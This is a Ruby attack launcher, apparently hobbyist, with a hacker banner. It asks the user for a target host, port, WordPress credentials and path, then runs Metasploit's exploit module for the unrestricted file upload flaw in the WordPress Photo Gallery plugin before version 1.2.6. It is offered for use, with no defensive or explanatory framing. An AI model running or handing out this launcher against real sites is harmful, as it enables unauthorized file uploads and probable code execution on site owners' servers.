require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     WordPress Photo Gallery 
    Unrestricted File Upload

      photo-gallery < 1.2.6
         
""".red


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is the Username? ".blue
print "[!] ---> ".yellow
user = gets.chomp

puts " [?] What is the Password? ".blue
print " [!] ---> ".yellow
pass = gets.chomp

puts " [?] The base path to the wordpress application? ".blue
print " [!] ---> ".yellow
path = gets.chomp



exec("msfconsole -x 'use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg USERNAME #{user}' -x 'setg PASSWORD #{pass}' -x 'setg TARGETURI #{path}' -x 'run'")

